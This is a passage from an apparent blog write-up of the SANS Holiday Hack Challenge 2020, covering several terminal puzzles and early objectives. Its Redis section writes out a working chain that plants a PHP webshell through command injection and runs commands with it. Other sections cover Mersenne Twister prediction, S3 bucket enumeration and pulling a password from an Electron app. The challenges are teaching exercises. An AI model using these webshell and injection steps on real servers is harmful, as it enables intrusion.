drwx------ 1 www-data www-data 4096 Dec 31 10:54 html
player@f9292a141ef5:/var/www$ 
</code></pre></div><p>Ah! We can&rsquo;t see what&rsquo;s inside <code>/var/www/html</code>, but redis running as root shouldn&rsquo;t have any problems with that. That gives us a plan of attack. Write a webshell to somewhere in <code>/var/www/html</code> using the Redis command injection we have, and then execute commands as <code>www-data</code> (the webserver is running as this user) to read the <code>index.php</code> file they mention.</p>
<p>Writing a web shell via Redis is done by configuring Redis (via the command injection) where to save database snapshots, adding a new key containing a web shell, then saving a snapshot. This results in the web shell being written to the path we specified.</p>
<p>We know the web server is configured to use PHP, so a small PHP webshell like this should be fine.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?=</span><span style=color:#e6db74>`$_GET[1]`</span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>Let&rsquo;s write the shell to <code>/var/www/html/c.php</code>. Remember the hint we got when we cURL&rsquo;d the <code>maintenance.php</code> file stating that commands should be separated by commas. I lost some time by not reading that properly.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;config,set,dir,/var/www/html&#34;
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;config&#39; &#39;set&#39; &#39;dir&#39; &#39;/var/www/html&#39;
OK
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;config,set,dbfilename,c.php&#34;
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;config&#39; &#39;set&#39; &#39;dbfilename&#39; &#39;c.php&#39;
OK
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;set,shell,%3C%3F%3D%60%24_GET%5B1%5D%60%3F%3E&#34;
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;set&#39; &#39;set&#39; &#39;&lt;?=`$_GET[1]`&#39;
OK
</code></pre></div><p>And just to confirm the url encoding of our shell meant that the value was correctly stored in Redis.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;get,shell&#34;
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;get&#39; &#39;set&#39;
&lt;?=`$_GET[1]`?&gt;
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=&#34;save&#34;
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;save&#39;
OK
</code></pre></div><p>Assuming that worked, we can now call our PHP web shell!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>curl http://localhost/c.php?1=id --output -
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime��_used-mem�p 
 aof-preamble���  shelluid=33(www-data) gid=33(www-data) groups=33(www-data)
example2#We think there&#39;s a bug in index.phexample1¬The site is in maintenance mode�?E�=��pl
</code></pre></div><p>The output seems a bit messed up, and there is a perfectly reasonable explanation for this. See, when we saved the Redis database, it also saved everything else that was stored in it. The fact that we enclosed our webshell with <code>&lt;?</code> & <code>?></code> tags just means that that specific section will be interpreted by the PHP interpreter. Everything else will output raw. Heh. (In pure PHP files you can leave out the trailing <code>?></code>, but in this case that would break the shell).</p>
<p>So, to solve the challenge we can just cat the <code>index.php</code> file.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>ayer@f9bfa34faa14:~$ curl http://localhost/c.php?1=cat%20index.php --output -
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime��_used-mem�p 
 aof-preamble���  shell&lt;?php
# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
# 
echo &#34;Something is wrong with this page! Please use http://localhost/maintenance.php to see 
if you can figure out what&#39;s going on&#34;
?&gt;
example2#We think there&#39;s a bug in index.phexample1¬The site is in maintenance mode�?E�=��pl
</code></pre></div><p>Solving this challenge unlocks hints for the Broken Tag Generator objective.</p>
<h3 id=scapy-prepper>scapy prepper<a hidden class=anchor aria-hidden=true href=#scapy-prepper>#</a></h3>
<p><em>Alabaster Snowball</em> stands next to a terminal called &ldquo;Scapy Prepper&rdquo; in the netwars room. Looks like this is just a gentle scapy introduction.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_scapy_prepper_alabaster_snowball.png> <figcaption>
scapy prepper terminal in the netwars room
</figcaption>
</figure>
<p>Opening the terminal presents us with a starting point.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_scapy_prepper_shell.png> <figcaption>
scapy prepper terminal initial shell
</figcaption>
</figure>
<p>This is a really, really simple terminal challenge. Answering the questions simply takes fiddling around as they suggest in the questions, and some simple documentation scanning.</p>
<p>A transcript of what my answers were:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&gt;&gt;&gt; task.submit(&#39;start&#39;)
&gt;&gt;&gt; task.submit(send)
&gt;&gt;&gt; task.submit(sniff)
&gt;&gt;&gt; task.submit(1)
&gt;&gt;&gt; task.submit(rdpcap)
&gt;&gt;&gt; task.submit(2)
&gt;&gt;&gt; task.submit(UDP_PACKETS[0])
&gt;&gt;&gt; task.submit(TCP_PACKETS[1][IP][TCP])
&gt;&gt;&gt; UDP_PACKETS[0][IP].src = &#39;127.0.0.1&#39;
&gt;&gt;&gt; task.submit(UDP_PACKETS[0])
&gt;&gt;&gt; TCP_PACKETS.show()
0000 Ether / IP / TCP 192.168.0.114:1137 &gt; 192.168.0.193:ftp S
0001 Ether / IP / TCP 192.168.0.193:ftp &gt; 192.168.0.114:1137 SA
0002 Ether / IP / TCP 192.168.0.114:1137 &gt; 192.168.0.193:ftp A
0003 Ether / IP / TCP 192.168.0.193:ftp &gt; 192.168.0.114:1137 PA / Raw
0004 Ether / IP / TCP 192.168.0.114:1137 &gt; 192.168.0.193:ftp PA / Raw
0005 Ether / IP / TCP 192.168.0.193:ftp &gt; 192.168.0.114:1137 PA / Raw
0006 Ether / IP / TCP 192.168.0.114:1137 &gt; 192.168.0.193:ftp PA / Raw
0007 Ether / IP / TCP 192.168.0.193:ftp &gt; 192.168.0.114:1137 PA / Raw
&gt;&gt;&gt; TCP_PACKETS[6]
&lt;Ether  dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |&lt;IP  version=4 ihl=5 tos=0x0 
len=51 id=42982 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd05a src=192.168.0.114 dst=192.16
8.0.193 |&lt;TCP  sport=1137 dport=ftp seq=3753095950 ack=3334930821 dataofs=5 reserved=0 flags
=PA window=17357 chksum=0xe96b urgptr=0 |&lt;Raw  load=&#39;PASS echo\r\n&#39; |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; task.submit(&#39;echo&#39;)
&gt;&gt;&gt; task.submit(ICMP_PACKETS[1][ICMP].chksum)
&gt;&gt;&gt; task.submit(3)
&gt;&gt;&gt; task.submit(IP(dst=&#39;127.127.127.127&#39;)/UDP(dport=5000))
&gt;&gt;&gt; task.submit(IP(dst=&#39;127.2.3.4&#39;)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=&#39;elveslove.santa&#39;)))
&gt;&gt;&gt; ARP_PACKETS[1][ARP].op = 2
&gt;&gt;&gt; ARP_PACKETS[1][ARP].hwsrc = &#34;00:13:46:0b:22:ba&#34;
&gt;&gt;&gt; ARP_PACKETS[1][ARP].hwdst = &#34;00:16:ce:6e:8b:24&#34;
&gt;&gt;&gt; task.submit(ARP_PACKETS)
</code></pre></div><p>Solving this challenge revealed more broken tag generator objective hints.</p>
<h3 id=can-bus-investigation>can-bus investigation<a hidden class=anchor aria-hidden=true href=#can-bus-investigation>#</a></h3>
<p><em>Wunorse Openslae</em> stands next to a terminal called &ldquo;CAN-Bus Investigation&rdquo; in the netwars room. Looks like were about to do some car hacking</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_canbus_investigation.png> <figcaption>
can-bus investigation terminal in the netwars room
</figcaption>
</figure>
<p>Opening the terminal presents us with a starting point.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_can_bus_investigation_shell.png> <figcaption>
can-bus investigation terminal initial shell
</figcaption>
</figure>
<p>Now this one was tricky for me initially because I misread the question. The terminal states that you need to find the UNLOCK command:</p>
<blockquote>
<p>Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We&rsquo;d like to encode another key mechanism.</p>
</blockquote>
<p>I thought there was <em>another</em> unlock, after the second LOCK. Turns out they just wanted the timestamp for the single UNLOCK command in the log. Some simple <code>grep</code> should be enough to find it. Just reduce the log entries until you have narrowed it down. The log primarily has <code>244</code> entries, so filter those out first. Next were the <code>188</code> commands. That should leave you with this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@0a028f799e8a:~$ cat candump.log  | grep -Ev &#34;244|188&#34;
(1608926664.626448) vcan0 19B#000000000000
(1608926671.122520) vcan0 19B#00000F000000
(1608926674.092148) vcan0 19B#000000000000
</code></pre></div><p>That second one is probably the unlock, so run the binary suggested with <code>122520</code> entered when asked.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@0a028f799e8a:~$ ./runtoanswer 
There are two LOCK codes and one UNLOCK code in the log.  What is the decimal portion of the
 UNLOCK timestamp?
(e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.
&gt; 122520
Your answer: 122520

Checking....
Your answer is correct!
</code></pre></div><p>Solving this challenge has Wunorse tell us that Santa&rsquo;s Sleigh uses a variation of CANBUS called CAN-D Bus. There&rsquo;s also something up with the brakes and door locks, and he suggests we filter out messages that seem out of place.</p>
<h3 id=sort-o-matic>sort-o-matic<a hidden class=anchor aria-hidden=true href=#sort-o-matic>#</a></h3>
<p><em>Minty Candycane</em> stands next to a terminal called &ldquo;Sort-o-matic&rdquo; in the workshop. This terminal seems to be a present sorter based on Regular Expressions. This challenge was also the one I disliked the most. It was finiky, and well, it was regex based :(</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_sort_o_matic.png> <figcaption>
sort-o-matic terminal in the workshop
</figcaption>
</figure>
<p>Opening the terminal presents us with a starting point.</p>
<p><figure>
<img loading=lazy src=/images/holidayhack-20/terminal_sort_o_matic_1.png> <figcaption>
sort-o-matic terminal initial screen
</figcaption>
</figure>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_sort_o_matic_2.png> <figcaption>
sort-o-matic terminal initial answers screen
</figcaption>
</figure>
</p>
<p>You could click on the questions to get an idea of what type of regular expression they looked for. Some questions had example data that the regex had to match and not match. I had valid answers that would have invalid matches be accepted, which wasn&rsquo;t great.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_sort_o_matic_question.png> <figcaption>
sort-o-matic question format
</figcaption>
</figure>
<p>My answers to the 8 questions were (thanks <a href=https://twitter.com/hypnza>@hypnza</a> for saving my sanity here):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>1. \d
2. [a-zA-Z]{3,}
3. [a-z0-9]{2,}
4. [^A-L^1-5]{2,}
5. ^[0-9]{3,}$
6. ^(?:([01]?\d|2[0-3]):([0-5]?\d){2}:)?([0-5]?\d)$
7. ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$
8. ^([0-9]{2}[\/.-][0-2]{1}[0-9]{1}[\/.-][0-9]{4})$ (thanks @Hypn)
</code></pre></div><p>Solving this terminal unlocked some hints for the Splunk objective.</p>
<h3 id=snowball-fight>snowball fight<a hidden class=anchor aria-hidden=true href=#snowball-fight>#</a></h3>
<p><em>Tangle Coalbox</em> stands next to a terminal called &ldquo;Snowball Fight&rdquo; in the Speaker Unpreparedness Room. This terminal seems to be a battleships-like game where you face off against a computer opponent.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snowball_fight.png> <figcaption>
snowball fight terminal in the speaker unpreparedness room
</figcaption>
</figure>
<p>Opening the terminal presents us with a splash screen where we could choose a difficulty, and for some levels, a player name. A suggested name was given at the start as an integer.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snowball_fight_splash.png> <figcaption>
snowball fight game splash screen
</figcaption>
</figure>
<p>Starting a game you see two squares, one where your fortresses are and another where you have to guess where your enemies' fortresses are.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snow_ball_player.png> <figcaption>
snowball fight player fortresses
</figcaption>
</figure>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snow_ball_enemy.png> <figcaption>
snowball fight enemy fortresses that you guessed
</figcaption>
</figure>
<p>The aim was to win a game on impossible, but if you gave that a try you&rsquo;d see that it’s pretty much impossible. The computer always hit your fortresses with perfect accuracy. Reading the hints given on your badge and by Tangle Coalbox you&rsquo;d come to realise that the aim here was to predict the numbers used by the computers random number generator. When you chose to play an easy game, your username was used as a seed to determine where all of the fortresses (yours and the computers) would be positioned. If you started multiple consecutive games with the same name (read: seed), the positions would have been exactly the same.</p>
<p>But on impossible you don’t get to choose your name, the computer generated it for you, and what’s worse, you don’t get to see what it chose. This is what we had to predict. Watching Tom Liston&rsquo;s <a href="https://www.youtube.com/watch?v=Jo5Nlbqd-Vg">talk</a> was key for me to solving this. I learnt a ton about the <a href=https://en.wikipedia.org/wiki/Mersenne_Twister>Mersenne Twister</a> pseudorandom number generator (PRNG), and ways to abuse it. Tim&rsquo;s talk also contained a link to a project of his to help predict the next values of a PRNG granted you were able to seed it with at least 624 previous, sequential values <a href=https://github.com/tliston/mt19937>here</a>.</p>
<p>Anyways, I&rsquo;m repeating what Tom said in the talk, but I really enjoyed this one okay :) Back to the game, when you start a game on impossible, (conveniently) 624 seeds are placed in an HTML comment that you can view.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snow_ball_seeds.png> <figcaption>
snowball fight impossible seeds in comment
</figcaption>
</figure>
<p>Right at the end of that comment you&rsquo;d find:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>    3206067930 - Not random enough
    288869423 - Not random enough
    1494780797 - Not random enough
    4089687663 - Not random enough
    &lt;Redacted!&gt; - Perfect!
  --&gt;
</code></pre></div><p>Couple this with Tom&rsquo;s code and we have everything we need to beat the game on impossible. I played around a bit with the PRNG predictor to test that it works fine, and then moved on to extracting the numbers from the game&rsquo;s HTML comment to feed into the predictor. I copied the comment out and ran it through this one-liner.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>cat seeds.txt | awk -F&#39;-&#39; &#39;{print $1}&#39;  | awk &#39;{print $1}&#39; &gt; seed
</code></pre></div><p>Next, I wrote a small script that imported the <code>mt19937</code> class and <code>untemper</code> function from Tom&rsquo;s code, read the seeds from my file, populated the 624 values it had and then ran the <code>extract_number()</code> function to get the next value. Pretty much exactly like it was done in the script&rsquo;s example.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> mt19937 <span style=color:#f92672>import</span> mt19937, untemper

<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;seeds&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
    seeds <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()

seeds <span style=color:#f92672>=</span>  [int(x<span style=color:#f92672>.</span>strip()) <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> seeds]

myprng <span style=color:#f92672>=</span> mt19937(<span style=color:#ae81ff>0</span>)

<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(mt19937<span style=color:#f92672>.</span>n):
    myprng<span style=color:#f92672>.</span>MT[i] <span style=color:#f92672>=</span> untemper(seeds[i])

print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;next #: </span><span style=color:#e6db74>{</span>myprng<span style=color:#f92672>.</span>extract_number()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>Using the predicted number of <code>324105638</code>, we then start a new easy game making <code>324105638</code> our username in an incognito tab, winning it to reveal the positions of the enemy fortresses.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snow_ball_easy_predict.png> <figcaption>
snowball fight easy game with predicted seed
</figcaption>
</figure>
<p>Knowing where the enemy&rsquo;s fortresses are with the predicted seed, we can now play a surgically accurate game on impossible.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_snow_ball_impossible_predict.png> <figcaption>
snowball fight easy game with predicted seed
</figcaption>
</figure>
<p>Solving this challenge provides hints for the later blockchain challenges, 11a & 11b.</p>
<h2 id=objectives>objectives<a hidden class=anchor aria-hidden=true href=#objectives>#</a></h2>
<p>Many of the objectives required hints from some of the <a href=#terminals>terminal</a> challenges first. I didn&rsquo;t really have a strategy other than walking around and clicking on terminals as I saw them. As I went through them, I chose to do the main objectives that were available next to them as well. At first, only the first 5 main objectives were visible until you unlocked the door in Santas workshop to impersonate him.</p>
<h3 id=1---uncover-santas-gift-list>1 - uncover santas gift list<a hidden class=anchor aria-hidden=true href=#1---uncover-santas-gift-list>#</a></h3>
<p>When you first login you start off in a staging area. The first objective on your badge reads:</p>
<blockquote>
<p>There is a photo of Santa&rsquo;s Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.</p>
</blockquote>
<p>Hopping around to the top left reveals the billboard, and when you click it a new tab opens with the image: <a href=https://2020.kringlecon.com/textures/billboard.png>https://2020.kringlecon.com/textures/billboard.png</a></p>
<figure>
<img loading=lazy src=/images/holidayhack-20/staging.png> <figcaption>
billboard in the staging area
</figcaption>
</figure>
<p>The part you need to focus on in the image is the list at the bottom left that has this &ldquo;swirling&rdquo; effect to it. It isn&rsquo;t easy to make out what it says, as expected. But, if you&rsquo;ve ever played with image editing tools before you&rsquo;d know that it&rsquo;s not hard to create this effect.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/swirl_orig.png> <figcaption>
santas swirled gift list
</figcaption>
</figure>
<p>This challenge had me mad. I tried many tools, tweaking their &ldquo;swirl-tool&rdquo; equivalent&rsquo;s properties such as size, &ldquo;harshness&rdquo; etc. applying the swirling effect in the opposite direction (right). In the end, I used <a href=https://www.photopea.com/>https://www.photopea.com/</a>&rsquo;s &ldquo;Twirl&rdquo; tool but instead of trying to &ldquo;untwirl&rdquo; the whole list, I had success with a smaller &ldquo;untwirl&rdquo; revealing Josh&rsquo;s entry as getting a <em>proxmark</em>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santas_gift_list.png> <figcaption>
josh getting a proxmark!
</figcaption>
</figure>
<h3 id=2---investigate-s3-bucket>2 - investigate s3 bucket<a hidden class=anchor aria-hidden=true href=#2---investigate-s3-bucket>#</a></h3>
<blockquote>
<p>When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.</p>
</blockquote>
<figure>
<img loading=lazy src=/images/holidayhack-20/investigate_s3_bucket.png> <figcaption>
investigate s3 bucket in the entry area
</figcaption>
</figure>
<p>Talking to Shinny Upatree, we get (after solving the terminal next to the challenge):</p>
<blockquote>
<p>Say, we&rsquo;ve been having an issue with an Amazon S3 bucket.<br>
Do you think you could help find Santa&rsquo;s package file?<br>
Jeepers, it seems there&rsquo;s always a leaky bucket in the news. You&rsquo;d think we could find our own files!<br>
Digininja has a great guide, if you&rsquo;re new to S3 searching.<br>
He even released a tool for the task - what a guy!<br>
The package wrapper Santa used is reversible, but it may take you some trying.</p>
</blockquote>
<p>Great, so get a file from S3, and have a look at it? The opening terminal for this challenge looked like this.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/investigate_s3_bucket_shell.png> <figcaption>
investigate s3 bucket starting terminal
</figcaption>
</figure>
<p>A directory called <code>bucket_finder</code> contained <a href=https://digi.ninja/projects/bucket_finder.php>Bucket Finder</a> by <a href=https://twitter.com/digininja>@digininja</a> pre-setup with a wordlist. Running it gave:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@cb4ef197f1c4:~/bucket_finder$ ./bucket_finder.rb wordlist 
http://s3.amazonaws.com/kringlecastle
Bucket found but access denied: kringlecastle
http://s3.amazonaws.com/wrapper
Bucket found but access denied: wrapper
http://s3.amazonaws.com/santa
Bucket santa redirects to: santa.s3.amazonaws.com
http://santa.s3.amazonaws.com/
        Bucket found but access denied: santa
</code></pre></div><p>I was stumped for a while on this one. Most of my attempts was me messing with permutations of the words in the provided word list (I figured those bucket names were generic and surely they were taken before Kringlecon 3), until I noticed the <code>wrapper3000</code> hint, and added that to the word list.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@cb4ef197f1c4:~/bucket_finder$ ./bucket_finder.rb -d wordlist 
http://s3.amazonaws.com/kringlecastle
Bucket found but access denied: kringlecastle
http://s3.amazonaws.com/wrapper
Bucket found but access denied: wrapper
http://s3.amazonaws.com/santa
Bucket santa redirects to: santa.s3.amazonaws.com
http://santa.s3.amazonaws.com/
        Bucket found but access denied: santa
http://s3.amazonaws.com/wrapper3000
Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )
        &lt;Downloaded&gt; http://s3.amazonaws.com/wrapper3000/package
</code></pre></div><p>Adding <code>-d</code> to <code>bucket_finder.rb</code> will also download files found in the bucket, which in this case meant that we got the file called <code>package</code>. If we were to <code>cat package</code> to see what&rsquo;s inside, we&rsquo;ll find a base64 string.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ cat package 
UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AX
yl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0
ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFAC
gIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADL
e80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbj
cBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ce
DQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn
/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2th
Z2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA
elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$
</code></pre></div><p>Easy, the next step was to base64 decode the file ofc.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_investigate_s3_bucket_base64.png> <figcaption>
package base64 decoded showing nonprintable and many familiar file headers
</figcaption>
</figure>
<p>That resulted in a bunch of nonprintable characters, but, it was possible to make out that this could be a zipfile based on some familiar strings in the output. You could confirm that using the <code>file</code> command as well.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ cat package | base64 -d | file -
/dev/stdin: Zip archive data, at least v1.0 to extract
</code></pre></div><p>Great! So let&rsquo;s redirect the decoding to a file and unzip it!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ cat package | base64 -d &gt; package.zip
elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ unzip package.zip
Archive:  package.zip
 extracting: package.txt.Z.xz.xxd.tar.bz2  
elf@cb4ef197f1c4:~/bucket_finder/wrapper3000$ ls -l
total 12
-rw-r--r-- 1 elf elf 829 Dec 30 15:44 package
-rw-r--r-- 1 elf elf 415 Dec  4 11:04 package.txt.Z.xz.xxd.tar.bz2
-rw-r--r-- 1 elf elf 621 Dec 30 15:50 package.zip
</code></pre></div><p>Given all of the file extensions the resultant file has, by now we should know why this is called <code>package</code>. Solving this from here should be mostly trivial, repeating the same process we have been following to unpack/decompress the relevant format.</p>
<p>I copied over the base64 found in <code>package</code> to my computer, and wrote a one-liner to get to the final message.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat package | base64 -D | funzip | tar -zxOf - | xxd -r - | unxz - | uncompress -
North Pole: The Frostiest Place on Earth
</code></pre></div><h3 id=3---point-of-sale-password-recovery>3 - point-of-sale password recovery<a hidden class=anchor aria-hidden=true href=#3---point-of-sale-password-recovery>#</a></h3>
<blockquote>
<p>Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What&rsquo;s the password?</p>
</blockquote>
<p>After completing the <a href=#linux-primer>linux primer</a> terminal challenge, some hints one how to solve this one is given.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santa_shop.png> <figcaption>
santa shop in courtyard
</figcaption>
</figure>
<p>Opening the challenge we get a link to download an executable at <a href=https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe>https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe</a>.</p>
<p>I took this file and ran it on a Windows VM, which installed what looked like an Electron application and presented me with the password screen the challenge referred to. The hint we get from the terminal challenge tells us that it is possible to extract JavaScript source code for electron apps using a utility called <a href=https://www.npmjs.com/package/asar>asar</a>. More specifically, this utility can read the archive format for <code>.asar</code> files, and we have to get that from the Point-of-Sale application.</p>
<p>To get the file, open the task manager after running santa-shop. Browse to the &ldquo;Details&rdquo; tab and search for the <code>santa-shop.exe</code> process. Right click any of the few and hit &ldquo;Open file location&rdquo;.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/pos_pass_file_loc.png> <figcaption>
open file location dialog in windows task manager
</figcaption>
</figure>
<p>Next, open the <code>resources/</code> directory where you will find a file called <code>app.asar</code>. I copied this to my host.</p>
<p>The next steps are to extract the contents of this file. One of the hints you get suggests that you do this with <code>npm install -g asar</code>, however, I did it without the <code>-g</code> flag. I don&rsquo;t like node in general, and having stuff in my global <code>node_modules</code> is not something I like either. Instead, I installed it with <code>npm install asar</code> which created a <code>node_modules</code> folder in my current working directory. Then, to run <code>asar</code> I use a utility called <code>npx</code>, meaning I can invoke a locally installed instance of <code>asar</code> with <code>npx asar</code>.</p>
<p>Great, with <code>app.asar</code> ready, the next step is to extract it with <code>npx asar extract app.asar src</code>. This will leave the contents of the archive in the <code>src/</code> directory. Then, to solve this challenge, simply grep for <code>password</code>, ignoring case.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santa_shop_solve.png> <figcaption>
the password was 'santapass'
</figcaption>
</figure>
<p>Notice the <code>SANTA_PASSWORD</code> constant.</p>
<h3 id=4---operate-the-santavator>4 - operate the santavator<a hidden class=anchor aria-hidden=true href=#4---operate-the-santavator>#</a></h3>
<p>This objective did not really give you a lot to work with directly.</p>
<blockquote>
